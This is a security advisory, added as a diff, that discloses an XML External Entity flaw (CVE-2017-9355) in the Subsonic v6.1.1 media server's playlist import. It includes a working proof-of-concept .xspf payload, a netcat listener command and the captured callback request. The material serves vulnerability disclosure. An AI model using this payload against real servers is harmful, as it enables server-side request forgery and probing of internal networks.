@@ -1,0 +1,102 @@
+[+] Credits: John Page a.k.a hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/SUBSONIC-XML-EXTERNAL-ENITITY.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+================
+www.subsonic.org
+
+
+
+Product:
+===============
+subsonic v6.1.1
+
+Subsonic is a media streaming server. You install it on your own computer where you keep your music or video collection.
+
+
+
+Vulnerability Type:
+====================
+XML External Entity 
+
+
+
+CVE Reference:
+==============
+CVE-2017-9355
+
+
+
+
+Security Issue:
+================
+subsonic import playlist feature is succeptible to XML External Entity attack. To exploit a User must be tricked to
+import a malicious .XSPF playlist file. The XXE injection can be used to target various hosts from the internal network 
+to bypass Firewall or from the internet as XML External Entity is related to Server Side Request Forgery (SSRF) attacks.
+
+
+
+
+Exploit/POC:
+=============
+1) Create some playlist file "RainbowsNUnic0rns.xspf" 
+
+<?xml version="1.0"?>
+<!DOCTYPE mmmmmRaisins [ 
+<!ENTITY % mmmm SYSTEM "http://127.0.0.1:1337/">
+%mmmm;]>
+
+
+2) Import as playlist.
+
+
+3) Start listener.
+
+nc.exe -llvp 1337
+listening on [any] 1337 ...
+
+connect to [127.0.0.1] from USER-PC [127.0.0.1] 64428
+GET / HTTP/1.1
+Cache-Control: no-cache
+Pragma: no-cache
+User-Agent: Java/1.8.0_45
+Host: 127.0.0.1:1337
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+==================================
+Vendor Notification:  May 29, 2017
+Vendor Acknowledgement: May 30, 2017
+June 4, 2017  : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
